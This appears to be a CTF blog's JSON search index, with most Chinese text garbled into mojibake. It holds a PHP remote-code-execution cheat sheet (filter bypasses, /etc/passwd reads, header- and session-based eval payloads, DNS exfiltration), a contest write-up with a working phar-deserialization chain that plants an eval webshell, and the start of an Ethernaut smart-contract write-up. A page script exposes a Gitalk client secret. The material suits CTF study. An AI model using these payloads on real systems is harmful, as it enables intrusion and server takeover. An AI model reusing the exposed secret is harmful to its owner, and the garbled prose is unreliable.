{"pages":[{"title":"","text":"ğŸš© A CTFer ğŸ’– ACGN ğŸ–¥ï¸ Web 2.0 &amp; Web .03 ğŸª— Smart Contract My Skill Set Frontend Backend DevOps Connect with me About My Usernameè¿™ä¸å¾—ä¸å¾—æèµ·æˆ‘çš„é«˜ä¸­ç”Ÿæ´»äº†ã€‚é«˜ä¸€å†›è®­çš„æ—¶å€™ï¼Œæ•™å®˜å«æˆ‘å°èƒ–ï¼Œäºæ˜¯æˆ‘åŒå­¦å°±å¼€å§‹å«æˆ‘é˜¿èƒ–ã€‚æˆ‘çš„é«˜ä¸­è‹±è¯­è€å¸ˆæ™®é€šè¯ä¸æ ‡å‡†ï¼Œæºæ‚ç€ä¸€è‚¡æµ“çƒˆçš„æ–¹è¨€å‘³é“ï¼Œç”šè‡³è‹±æ–‡å•è¯éƒ½æœ‰ä¸€è‚¡æµ“çƒˆçš„â€œåœ°æ–¹ç‰¹è‰²â€ï¼Œæœ‰ä¸€å¤©ï¼Œä»–è¯»è¯¾æ–‡ï¼Œå…´è‡´æ­£æµ“ï¼Œåˆšå¥½è¯»åˆ°äº†ä¸€å¥è¯ï¼Œæ°å·§è¿™å¥è¯é‡Œåˆæœ‰ä¸€ä¸ªuponï¼Œè€Œè¿™ä¸ªuponä»–åˆä¸“é—¨åœé¡¿ä¸€ä¸‹ï¼Œé‡(zhong)è¯»ã€‚å½“æ—¶ï¼Œä¸€è‚¡é›„åšæ— æ¯”è€Œåˆå¤¹æ‚ç€æ–¹è¨€å‘³é“çš„å£°æµªè¢­æ¥ï¼Œä¹‹åæˆ‘åŒå­¦éƒ½ç®¡æˆ‘å«uponäº†ã€‚ è‡³äºåé¢çš„æ•°å­—ï¼Œä¿ºæ¯”è¾ƒæ‡’ï¼Œå“ªå¹´æ³¨å†Œçš„åé¢å°±å†™çš„å“ªå¹´ï¼Œå½“ç„¶ä¹Ÿæœ‰ç‰¹ä¾‹ï¼Œå°±æ˜¯2016ï¼Œè¿™ä¸ªä»£è¡¨çš„ä¸æ˜¯2016å¹´ï¼Œè€Œæ˜¯æŒ‡æ¯”ç‰¹å¸æ¯2016ä¸ªåŒºå—ä¼šå˜æ›´ä¸€æ¬¡æŒ–çŸ¿éš¾åº¦ï¼Œåœ¨ä¸€äº›ä¸åŒºå—é“¾æœ‰å…³çš„ç¤¾åŒºï¼Œæˆ‘æ³¨å†Œçš„idå¤§å¤šæ˜¯UPON-2016","link":"/about/index.html"},{"title":"","text":"ä½ ä¼¼ä¹æ¥åˆ°äº†ä¸–ç•Œçš„å°½å¤´","link":"/album/index.html"},{"title":"","text":"&nbsp;&nbsp;å¬å¬éŸ³ä¹ éŸ³ä¹æ’­æ”¾å™¨ç”±mePlayeræä¾›ï¼Œå¸ƒå±€å‚ç…§ç½‘å‹åšå®¢æ‰€ä½œï¼Œæ„Ÿè°¢ä½œè€…çš„è¾›å‹¤ä»˜å‡ºã€‚æ›´å¤šéŸ³ä¹åˆ†äº«è¯·æŸ¥çœ‹æ­Œå•ã€‚ &nbsp;&nbsp;çœ‹çœ‹è§†é¢‘ ->ç‚¹å‡»ä»¥ä¸‹æ¡ç›®å¼€å§‹æ’­æ”¾è§†é¢‘,å‘ä¸‹æ»‘åŠ¨æŸ¥çœ‹æ›´å¤š","link":"/media/index.html"},{"title":"","text":"å‹æƒ…é“¾æ¥è¿˜åœ¨æ·»åŠ ä¸­qwq åŠ è½½ä¸­ï¼Œç¨ç­‰å‡ ç§’...","link":"/friend/index.html"},{"title":"éŸ³ä¹æ­Œå•æ”¶è—","text":"æ¸©é¦¨æç¤ºï¼šé€‰æ‹©å–œæ¬¢çš„éŸ³ä¹åŒå‡»æ’­æ”¾ï¼Œç”±äºç‰ˆæƒåŸå› éƒ¨åˆ†ä¸èƒ½æ’­æ”¾ã€‚å¦‚æœå–œæ¬¢æ­Œå•æ”¶è—ä¸€ä¸‹ï¼Œå»ç½‘æ˜“äº‘éƒ½èƒ½æ’­æ”¾å“Ÿï¼","link":"/music/index.html"},{"title":"","text":"ç¢ç¢å¿µ tipsï¼šgithubç™»å½•åæŒ‰æ—¶é—´æ­£åºæŸ¥çœ‹ã€å¯ç‚¹èµåŠ â¤ï¸ã€æœ¬æ’ä»¶åœ°å€..ã€Œ+99æ¬¡æŸ¥çœ‹ã€ ç¢ç¢å¿µåŠ è½½ä¸­ï¼Œè¯·ç¨ç­‰... $.getScript(\"/js/gitalk_self.min.js\", function () { var gitalk = new Gitalk({ clientID: '46a9f3481b46ea0129d8', clientSecret: '79c7c9cb847e141757d7864453bcbf89f0655b24', id: '666666', repo: 'issue_database', owner: 'removeif', admin: \"removeif\", createIssueManually: true, distractionFreeMode: false }); gitalk.render('comment-container1'); });","link":"/self-talking/index.html"},{"title":"","text":"æ¥è€Œä¸å¾€éç¤¼ä¹Ÿç•…æ‰€æ¬²è¨€ï¼Œæœ‰ç•™å¿…åº”","link":"/message/index.html"}],"posts":[{"title":"å‘½ä»¤æ‰§è¡Œå¤‡å¿˜å½•","text":"0x00 ä»€ä¹ˆæ˜¯RCERCEåˆç§°è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œå¯ä»¥è®©æ”»å‡»è€…ç›´æ¥å‘åå°æœåŠ¡å™¨è¿œç¨‹æ³¨å…¥æ“ä½œç³»ç»Ÿå‘½ä»¤æˆ–è€…ä»£ç ï¼Œä»è€Œæ§åˆ¶åå°ç³»ç»Ÿã€‚ 0x01 å¸¸è§å‘½ä»¤æ‰§è¡Œå‡½æ•°12PHPä»£ç æ‰§è¡Œå‡½æ•°ï¼ševal()ã€assert()ã€preg_replace()ã€create_function()ã€array_map()ã€call_user_func()ã€call_user_func_array()ã€array_filter()ã€uasort()... 12PHPå‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼šsystem()ã€exec()ã€shell_exec()ã€pcntl_exec()ã€popen()ã€proc_popen()ã€passthru()... 0x02 Bypass1.å…³é”®è¯æ‹¦æˆª: å…³é”®è¯æ›¿æ¢ä¸ºç©ºçš„æƒ…å†µ: åŒå†™ç»•è¿‡ï¼Œæ¯”å¦‚cacatt -&gt; cat ä»…æ‹¦æˆªå…³é”®å­—: ä½¿ç”¨å…¶ä»–å‡½æ•°ï¼Œæ¯”å¦‚æ‹¦æˆªcatçš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨å…¶ä»–å‘½ä»¤ã€‚ Input Ouput static-sh ./flag.txt ./flag.txt: line 1: flag{this_is_a_test}: not found paste ./flag.txt /etc/passwd flag{this_is_a_test} root:x:0:0:root:/root:/bin/bashâ€¦ diff diff ./flag.txt /etc/passwd curl file:///home/coffee/flag flag{this_is_a_test} â€¦ â€¦ é€šé…ç¬¦ç»•è¿‡ï¼Œæ¯”å¦‚å¯ä»¥ä½¿ç”¨/b??/c?t f*ã€‚è¯¥æ–¹æ³•æœ‰æ—¶å€™ä¼šå› ä¸ºè¾“å‡ºè¿‡å¤šæˆ–è€…è¿è¡Œæ—¶é—´è¶…å‡ºé™åˆ¶è¢«å¼ºè¡Œä¸­æ–­ æ’å…¥&quot;&quot; &lt;&gt; '' \\ç»•è¿‡,æ¯”å¦‚ca''t flag.txtæˆ–è€…ca\\t flag.txt å†…è”æ‰§è¡Œï¼Œå°†åå¼•å·å†…å‘½ä»¤çš„è¾“å‡ºä½œä¸ºè¾“å…¥æ‰§è¡Œ,å¦‚: cat `ls`ï¼Œæˆ–è€…æ˜¯cat ${ls} ä½¿ç”¨å˜é‡æ›¿æ¢ï¼Œå¦‚$c=a;cat fl$cg.php æ‹¦æˆªç©ºæ ¼,ç©ºæ ¼å¯ä»¥ç”¨ä»¥ä¸‹å­—ç¬¦ä¸²ä»£æ›¿ï¼š &lt; ã€&lt;&gt;ã€%20(space)ã€%09(tab)ã€$IFS$9ã€ ${IFS}ã€$IFSç­‰ï¼Œæ¯”å¦‚: 123456cat%09flag{cat,flag.txt}cat${IFS}flag.txtcat$IFS$9flag.txtcat&lt;flag.txt cat&lt;&gt;flag.txt .æ“ä½œç¬¦ evalå‡½æ•°ä¸­ç”¨.æŠŠè¢«æ‹¦æˆªçš„å…³é”®å­—ç»™åˆ†å¼€ï¼Œæ¯”å¦‚ 12&lt;?php eval(include &quot;/www/lo&quot;.&quot;g/nginx/access.log&quot;); é€ƒé€¸ï¼Œç»•è¿‡å¤ªéš¾äº†ï¼Œç›´æ¥æ¶¦å‡ºæ¥æ¯”å¦‚ 12c=include$_GET[1]?&gt; c=eval($_GET[1]) å€Ÿå£³ç”Ÿè›‹ 12345678&lt;?php $env = $_GET['env']; if(isset($env)){ putenv($env); system(&quot;whoami&quot;); }else{ highlight_file(__FILE__); } ?env=BASH_FUNC_whoami%%=() { ls; }whoamiæ˜¯system(â€œwhoamiâ€)å¯åŠ¨çš„bashç¯å¢ƒçš„å‡½æ•°ï¼Œç›¸å½“äºæˆ‘ä»¬æ³¨å†Œäº†ä¸€ä¸ªwhoamiæ›¿æ¢å®ƒ æ„é€  åœ¨PHP7ä¸­ï¼Œå¯ä»¥è¿™æ ·è°ƒç”¨å‡½æ•°: 123('phpinfo')();$a = &quot;phpinfo&quot;;$$a;... ç„¶åå°±å¯ä»¥ä½¿ç”¨å¼‚æˆ–^,å–å~ï¼Œè‡ªå¢++ï¼Œè‡ªå‡--ç­‰æ–¹æ³•æ„é€ æƒ³è¦çš„å­—ç¬¦ç„¶åè¿›è¡ŒåŠ¨æ€å‡½æ•°è°ƒç”¨ã€‚ æ„é€ å­—ç¬¦çš„æ—¶å€™ï¼Œå¯ä»¥åˆ©ç”¨ä¸€äº›PHPçš„ç‰¹æ€§ï¼š PHPä¸­çš„NANå’ŒINFï¼š 123456NaNï¼ˆNot a Numberï¼Œéæ•°ï¼‰æ˜¯è®¡ç®—æœºç§‘å­¦ä¸­æ•°å€¼æ•°æ®ç±»å‹çš„ä¸€ç±»å€¼ï¼Œè¡¨ç¤ºæœªå®šä¹‰æˆ–ä¸å¯è¡¨ç¤ºçš„å€¼ã€‚å¸¸åœ¨æµ®ç‚¹æ•°è¿ç®—ä¸­ä½¿ç”¨ã€‚é¦–æ¬¡å¼•å…¥NaNçš„æ˜¯1985å¹´çš„IEEE 754æµ®ç‚¹æ•°æ ‡å‡†ã€‚INFï¼šinfiniteï¼Œè¡¨ç¤ºâ€œæ— ç©·å¤§â€ã€‚ è¶…å‡ºæµ®ç‚¹æ•°çš„è¡¨ç¤ºèŒƒå›´ï¼ˆæº¢å‡ºï¼Œå³é˜¶ç éƒ¨åˆ†è¶…è¿‡å…¶èƒ½è¡¨ç¤ºçš„æœ€å¤§å€¼ï¼‰ã€‚$_=C/C;//NAN$_=1/C//INF 2.æ— å›æ˜¾ åˆ©ç”¨sleep()ä¹‹ç±»çš„å‡½æ•°æ¥æ ¹æ®æœåŠ¡å™¨å“åº”çš„æ—¶é—´ä¸€ä¸ªä¸€ä¸ªå­—ç¬¦è·è·å–æ³¨:è¯¥æ–¹æ³•å±€é™æ€§å¾ˆå¤§ï¼Œä¸”å®¹æ˜“å—åˆ°ç½‘ç»œæ³¢åŠ¨å½±å“ï¼Œä¸å»ºè®®ä¼˜å…ˆè€ƒè™‘ä½¿ç”¨ åˆ©ç”¨dnså¤–å¸¦http://dnslog.cn/æ³¨:è¯¥æ–¹æ³•ä¹Ÿæœ‰ä¸€å®šçš„å±€é™æ€§ï¼Œæœ‰é•¿åº¦é™åˆ¶è€Œä¸”ä¸æ”¯æŒç‰¹æ®Šå­—ç¬¦ åˆ©ç”¨é‡å®šå‘ï¼Œå°†è¾“å‡ºé‡å®šå‘åˆ°å¯è®¿é—®ç½‘é¡µä¸­ åå¼¹shellå¦‚æœé¢˜ç›®ä¸å‡ºç½‘åªèƒ½å¯„ å‘½ä»¤æ³¨å…¥,å°è¯•åœ¨å‘½ä»¤åé¢åŠ ä¸Š||ã€%0aã€%0dã€|ã€;ã€&amp;ç­‰ç¬¦å·å°†åŸå…ˆé‡å®šå‘åˆ°/dev/nullçš„å‘½ä»¤åˆ†å‰²å¼€ 3.include ä¼ªåè®® æ—¥å¿—åŒ…å«UAå†™é©¬,åŒ…å«access.log allow_url_include=tureå¯ä»¥ä½¿ç”¨çš„data123456789101112131415dataç±»å‹æ‰©å±•: dataç±»å‹æ‰©å±• data:,&lt;æ–‡æœ¬æ•°æ®&gt; data:text/plain,&lt;æ–‡æœ¬æ•°æ®&gt; data:text/html,&lt;HTMLä»£ç &gt; data:text/html;base64,&lt;base64ç¼–ç çš„HTMLä»£ç &gt; data:text/css,&lt;CSSä»£ç &gt; data:text/css;base64,&lt;base64ç¼–ç çš„CSSä»£ç &gt; data:text/javascript,&lt;Javascriptä»£ç &gt; data:text/javascript;base64,&lt;base64ç¼–ç çš„Javascriptä»£ç &gt; data:image/gif;base64,base64ç¼–ç çš„gifå›¾ç‰‡æ•°æ® data:image/png;base64,base64ç¼–ç çš„pngå›¾ç‰‡æ•°æ® data:image/jpeg;base64,base64ç¼–ç çš„jpegå›¾ç‰‡æ•°æ® data:image/x-icon;base64,base64ç¼–ç çš„iconå›¾ç‰‡æ•°æ® Tips: PHPå…·æœ‰æå¼ºçš„é²æ£’æ€§ç‰¹åˆ«è€æ“ï¼Œå°¤å…¶æ˜¯ä¼ªåè®®è¿™å—ã€‚1234567åŸpayload:php://filter/convert.base64-encode/resource=index.phpæˆ‘å¯ä»¥æ’â™‚ å…¥ä¸€äº›å¥‡æ€ªçš„ä¸œè¥¿php://filter/convert.base64-encode/114514/resource=index.phpæˆ‘å¯ä»¥å¤§å¤§å°å°php://FiLTer/convert.base64-encode/resource=index.php 4.æ— å‚å‘½ä»¤æ‰§è¡Œè¿™ç§å°±åŸºæœ¬æ²¡æ´»èƒ½æ•´äº†ï¼Œå·²ç»ååˆ†å›ºå®šä¸‹æ¥äº† 123456&lt;?phphighlight_file(__FILE__);if(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['code'])) { eval($_GET['code']);}?&gt; '/[^\\W]+\\((?R)?\\)/'çš„è§£é‡Š è¿™é‡Œä½¿ç”¨pregreplaceæ›¿æ¢åŒ¹é…åˆ°çš„å­—ç¬¦ä¸ºç©ºï¼Œ\\wåŒ¹é…å­—æ¯ã€æ•°å­—å’Œä¸‹åˆ’çº¿ï¼Œç­‰ä»·äº [^A-Za-z0-9]ï¼Œç„¶å(?R)?è¿™ä¸ªæ„æ€ä¸ºé€’å½’æ•´ä¸ªåŒ¹é…æ¨¡å¼ã€‚æ‰€ä»¥æ­£åˆ™çš„å«ä¹‰å°±æ˜¯åŒ¹é…æ— å‚æ•°çš„å‡½æ•°ï¼Œå†…éƒ¨å¯ä»¥æ— é™åµŒå¥—ç›¸åŒçš„æ¨¡å¼ï¼ˆæ— å‚æ•°å‡½æ•°ï¼‰ï¼Œå°†åŒ¹é…çš„æ›¿æ¢ä¸ºç©ºï¼Œåˆ¤æ–­å‰©ä¸‹çš„æ˜¯å¦åªæœ‰; ä»¥ä¸Šæ­£åˆ™è¡¨è¾¾å¼åªåŒ¹é…a(b(c()))æˆ–a()è¿™ç§æ ¼å¼ï¼Œä¸åŒ¹é…a(â€œ123â€)ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¼ å…¥çš„å€¼å‡½æ•°ä¸èƒ½å¸¦æœ‰å‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä½¿ç”¨æ— å‚æ•°çš„å‡½æ•°è¿›è¡Œæ–‡ä»¶è¯»å–æˆ–è€…å‘½ä»¤æ‰§è¡Œã€‚ ä¸€äº›æœ‰ç”¨çš„ä¸œè¥¿ 12345678910111213141516171819202122ç›®å½•æ“ä½œï¼šgetchwd() ï¼šå‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚scandir() ï¼šå‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚dirname() ï¼šå‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚chdir() ï¼šå‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚æ•°ç»„ç›¸å…³çš„æ“ä½œï¼šend() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚next() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚prev() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚reset() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚each() - è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ã€‚array_shift() - åˆ é™¤æ•°ç»„ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¿”å›è¢«åˆ é™¤å…ƒç´ çš„å€¼ã€‚è¯»æ–‡ä»¶show_source() - å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æ˜¾ç¤ºã€‚readfile() - è¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚highlight_file() - å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æ˜¾ç¤ºã€‚file_get_contents() - æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚readgzfile() - å¯ç”¨äºè¯»å–é gzip æ ¼å¼çš„æ–‡ä»¶ PAYLOAD è¯·æ±‚å¤´ 123GET /1.php?code=eval(end(getallheaders())); HTTP/1.1.....flag: system('id'); get_defined_vars() 1?code=eval(end(current(get_defined_vars())));&amp;flag=system('ls'); åˆ©ç”¨å…¨å±€å˜é‡è¿›RCE get_defined_vars()ï¼šè¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ï¼Œä¼šè¿”å› _GET,_POST, _COOKIE, _FILESå…¨å±€å˜é‡çš„å€¼ï¼Œè¿”å›æ•°ç»„é¡ºåºä¸ºget-&gt;post-&gt;cookie-&gt;filescurrentï¼šè¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒï¼Œåˆå§‹æŒ‡å‘æ’å…¥åˆ°æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå•å…ƒï¼Œä¹Ÿå°±æ˜¯ä¼šè¿”å›$_GETå˜é‡çš„æ•°ç»„å€¼ 3.session_start() session_start()ï¼šå¯åŠ¨æ–°ä¼šè¯æˆ–è€…é‡ç”¨ç°æœ‰ä¼šè¯ï¼ŒæˆåŠŸå¼€å§‹ä¼šè¯è¿”å› TRUE ï¼Œåä¹‹è¿”å› FALSE,è¿”å›å‚æ•°ç»™session_id() session_id()ï¼šè·å–/è®¾ç½®å½“å‰ä¼šè¯ IDï¼Œè¿”å›å½“å‰ä¼šè¯IDã€‚ å¦‚æœå½“å‰æ²¡æœ‰ä¼šè¯ï¼Œåˆ™è¿”å›ç©ºå­—ç¬¦ä¸²ï¼ˆâ€â€ï¼‰ã€‚æ–‡ä»¶è¯»å– show_source(session_id(session_start())); var_dump(file_get_contents(session_id(session_start()))) highlight_file(session_id(session_start())); readfile(session_id(session_start()));æŠ“åŒ…ä¼ å…¥Cookie: PHPSESSID=(æƒ³è¯»çš„æ–‡ä»¶)å³å¯","link":"/2022/10/03/RCE/"},{"title":"ç¾å›¢CTFå†³èµ›å¤ç° mako","text":"å¤ªèœäº†ï¼Œè¢«å¤§ä½¬å¸¦è¿›å†³èµ›äº†,æœ€åå°±ç­¾ä¸ªåˆ° ç¯å¢ƒå¯†ç :1skr ä¸‹é¢éƒ¨åˆ†æ˜¯æˆ‘åœ¨æ¯”èµ›çš„æ—¶å€™æ€è€ƒè¿‡çš„ 1.å¼€å§‹é¡µé¢ä¸€è¿›æ¥ï¼Œååˆ†çš„æ¸…çˆ½ï¼Œæ¯›éƒ½æ²¡æœ‰ï¼Œå°±ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„ä¸œè¥¿ éšä¾¿ä¼ ç‚¹ä¸œè¥¿ï¼Œå‘ç°æ˜¯æ¥è€…ä¸æ‹’ï¼Œå•¥éƒ½èƒ½ä¼ ï¼Œä½†å•¥éƒ½å¹²ä¸äº†è®¿é—®1.phpåªä¼šå‡ºç°404not foundè¿™æ˜¯æœ€ä»¤äººå¼‚æˆ–çš„ä¸€ç‚¹ å› ä¸ºé¢˜ç›®ç»™äº†dockerï¼Œå°±æœ¬åœ°éƒ¨ç½²ä¸€ä¸ªç¯å¢ƒï¼Œå…ˆè¿›å»çœ‹çœ‹æ–‡ä»¶éƒ½å­˜åˆ°äº†å“ªé‡Œå¯ä»¥çœ‹è§ï¼Œæ–‡ä»¶å¹¶æ²¡æœ‰è¢«ä¸Šä¼ åˆ°/var/www/html/è¿™ä¸ªç›®å½•ä¸‹é¢ è€Œæ–‡ä»¶è¢«ä¸Šä¼ åˆ°äº†/var/www/html/mako/uploadsè¿™ä¸ªç›®å½•ä¸‹ å¯ä»¥è‚¯å®šçš„æ˜¯ï¼Œæ–‡ä»¶ä¸Šä¼ æ˜¯æ•´ä¸äº†æ´»äº† 2.å®¡è®¡é€šè¿‡æœç´¢å…³é”®è¯ï¼Œåœ¨mako/app/reources/views/home.tpl.phpé‡Œæ‰¾åˆ°åˆ°äº†é¦–é¡µçš„æºç  å¾ˆæ˜æ˜¾ï¼Œè¿™æ˜¯ç”¨æ¨¡ç‰ˆæ¸²æŸ“å‡ºæ¥çš„ä¸»é¡µ, å›¾ç‰‡éƒ½æ˜¯ä»¥base64çš„ç¼–ç å½¢å¼ä¼ é€’çš„ï¼Œæ²¡æ´»æ•´äº†ã€‚ è¿™å°±å¾ˆä»¤äººè‹¦æ¼ï¼Œæˆ‘å½“æ—¶å°è¯•äº†ä¸€ä¸‹ï¼Œä½¿ç”¨è½¯é“¾æ¥ ç›´æ¥å¯„äº†ï¼Œæ²¡æƒé™ï¼Œè¿™æ—¶å€™æ‰æƒ³èµ·æ¥å®¹å™¨ä¸€å¼€å§‹å†™äº†ä¸€ä¸ªè¯»å–flagçš„ç¨‹åº ç›®æ ‡ä¹Ÿæ˜ç¡®äº†ï¼Œè‚¯å®šå¾—æƒ³åŠæ³•æ‰§è¡ŒreadFlagï¼Œäºæ˜¯æˆ‘æœäº†å±é™©å‡½æ•°ï¼Œç„¶åæ˜¯ä¸€æ— æ‰€è·ï¼Œè¦ä¹ˆæ²¡è¿™ä¸ªå‡½æ•°ï¼Œè¦ä¹ˆæ ¹æœ¬æ— æ³•è§¦å‘ åšåˆ°è¿™é‡Œï¼Œæˆ‘å·²ç»æ²¡æœ‰æ€è·¯äº†ï¼Œå½“æ—¶æƒ³åˆ°äº†ååºåˆ—åŒ–ï¼Œä½†æ˜¯åªçŸ¥é“æœunseralizeï¼Œç»“æœæ˜¯æ¯›éƒ½æ²¡æœåˆ°ã€‚ æˆ‘ç»éªŒå¤ªå°‘äº†ï¼Œå½“æ—¶æ²¡æƒ³åˆ°ç”¨phar 3.å¤ç°åœ¨mako/app/controllers/ImagesController.phpæ–‡ä»¶ä¸­ 123456789public function editGet(ViewFactory $view): string { chdir('/var/www/mako/uploads'); $fileName = $this-&gt;request-&gt;getQuery()-&gt;get('filename'); $image = new Image($fileName, new ImageMagick()); $dimensions = $image-&gt;getDimensions(); $this-&gt;view-&gt;assign('fileName', $fileName); $this-&gt;view-&gt;assign('dimensions', $dimensions); return $view-&gt;render('edit');} å¯ä»¥çœ‹åˆ°ï¼Œæ–‡ä»¶åæ˜¯ä¸åšä»»ä½•è¿‡æ»¤çš„ è€Œåœ¨mako/vendo/mako/framework/src/mako/pixl/image.phpä¸­ 1234567891011121314151617public function __construct($image, ProcessorInterface $processor){ $this-&gt;image = $image; $this-&gt;processor = $processor; // Make sure that the image exists if(file_exists($this-&gt;image) === false) { throw new PixlException(vsprintf('The image [ %s ] does not exist.', [$this-&gt;image])); } // Set the image $this-&gt;processor-&gt;open($image);} ä½¿ç”¨äº†èƒ½è§¦å‘pharååºåˆ—åŒ–çš„file_existså‡½æ•° å…³é”®å‡½æ•°æ‰¾åˆ°äº†ï¼Œç°åœ¨æ‰¾é“¾å­å§ æœç´¢__destruct(),å¹²æ‰°é¡¹ä¸å¤šï¼Œå¯ä»¥ç›´æ¥å¼€æ’¸ å¥½å®¶ä¼™ï¼Œæˆ‘ç›´æ¥å¥½å®¶ä¼™ï¼Œä¸€æ¡é¾™æœåŠ¡äº†å±äºæ˜¯qwq 4.æ”»å‡»è¿™é‡Œæ¬ä¸€æ‰‹Arr3stY0uæˆ˜é˜Ÿçš„pocå§ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phpnamespace mako\\file{class FileSystem{}}namespace mako\\session\\stores{ use mako\\file\\FileSystem;class File{ protected $fileSystem; protected $sessionPath; public function __construct(){ $this-&gt;fileSystem = new FileSystem(); $this-&gt;sessionPath = '/var/www/mako/public/'; }}}namespace mako\\session{use mako\\session\\stores\\File;class Session{ protected $autoCommit; protected $destroyed = false; protected $sessionId; protected $sessionData = []; protected $store; public function __construct(){ $this-&gt;autoCommit = true; $this-&gt;destroyed = false; $this-&gt;store = new File(); $this-&gt;sessionId = 'shell.php'; $this-&gt;sessionData = ['a'=&gt;'&lt;?php eval($_POST[1]);?&gt;']; }}}namespace { $exp = new mako\\session\\Session(); $phar = new Phar('test.phar',0,'test.phar'); $phar-&gt;startBuffering(); $phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ?&gt;'); $phar-&gt;setMetadata($exp); $phar-&gt;addFromString('text.txt','test'); $phar-&gt;stopBuffering();}; ä¸Šä¼ æ–‡ä»¶getshellflag is here 5.æ€»ç»“åæ€ç»éªŒä¸è¶³ï¼Œåšé¢˜ä¸å¤Ÿï¼Œæ¬ ç»ƒ","link":"/2022/09/30/mt-ctf/"},{"title":"Ethernautåˆ·é¢˜è®°å½•","text":"è¸©å‘è®°å½•æ¥è‡ªè¿™é‡Œ å¯è§ä¿®é¥°ç¬¦publicprivateethernaut0.æ³¨æ„äº‹é¡¹ @openzeppelin/contracts/math/SafeMath.sol çš„åœ°å€å·²ç»è¿ç§»ï¼Œåšè¿™ä¸ªé¶åœºçš„æ—¶å€™å¾—è‡ªå·±æ‰‹åŠ¨æ”¹æˆ&quot;@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol&quot;; ä»¥å¤ªåŠä¸»ç½‘å³å°†è¿›è¡Œåˆå¹¶ï¼ŒRinkebyæµ‹è¯•ç½‘ç»œå°†äºä¸€å¹´ååœæ­¢è¿è¡Œï¼Œåˆ°æ—¶å€™å°±ä¸çŸ¥é“è¿™ä¸ªé¶åœºæ˜¯å¦è¿˜ä¼šç»§ç»­è¿è¡Œ ä¸åŒç‰ˆæœ¬çš„solidityè¯­è¨€ç‰¹æ€§ä¸ä¸€æ ·ï¼Œå¯èƒ½ä¼šæœ‰å…¼å®¹é—®é¢˜ Rinkebyçš„æµ‹è¯•ä»¥å¤ªéš¾ä»¥å¤§é‡è·å–ï¼Œåšé¢˜ä¸è¦ä¸€è‚¡è„‘æŠŠä»¥å¤ªå…¨å¡è¿›å»äº† 1.Falloutæè¿°12345678910111213è¿™å¾ˆç™½ç—´æ˜¯å§? çœŸå®ä¸–ç•Œçš„åˆçº¦å¿…é¡»å®‰å…¨çš„å¤š, éš¾ä»¥å…¥ä¾µçš„å¤š, å¯¹å§?å®é™…ä¸Š... ä¹Ÿæœªå¿….Rubixiçš„æ•…äº‹åœ¨ä»¥å¤ªåŠç”Ÿæ€ä¸­éå¸¸çŸ¥å. è¿™ä¸ªå…¬å¸æŠŠåå­—ä» 'Dynamic Pyramid' æ”¹æˆ 'Rubixi' ä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆåœ°, ä»–ä»¬æ²¡æœ‰æŠŠåˆçº¦çš„ constructor æ–¹æ³•ä¹Ÿä¸€èµ·æ›´å:contract Rubixi { address private owner; function DynamicPyramid() { owner = msg.sender; } function collectAllFees() { owner.transfer(this.balance) } ...è¿™è®©æ”»å‡»è€…å¯ä»¥è°ƒç”¨æ—§åˆçº¦çš„constructor ç„¶åè·å¾—åˆçº¦çš„æ§åˆ¶æƒ, ç„¶åå†è·å¾—ä¸€äº›èµ„äº§. æ˜¯çš„. è¿™äº›é‡å¤§é”™è¯¯åœ¨æ™ºèƒ½åˆçº¦çš„ä¸–ç•Œæ˜¯æœ‰å¯èƒ½çš„. åˆçº¦ä»£ç 12345678910111213141516171819202122232425262728293031323334353637383940414243// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/math/SafeMath.sol';contract Fallout { using SafeMath for uint256; mapping (address =&gt; uint) allocations; address payable public owner; /* constructor */ function Fal1out() public payable { owner = msg.sender; allocations[owner] = msg.value; } modifier onlyOwner { require( msg.sender == owner, &quot;caller is not the owner&quot; ); _; } function allocate() public payable { allocations[msg.sender] = allocations[msg.sender].add(msg.value); } function sendAllocation(address payable allocator) public { require(allocations[allocator] &gt; 0); allocator.transfer(allocations[allocator]); } function collectAllocations() public onlyOwner { msg.sender.transfer(address(this).balance); } function allocatorBalance(address allocator) public view returns (uint) { return allocations[allocator]; }} 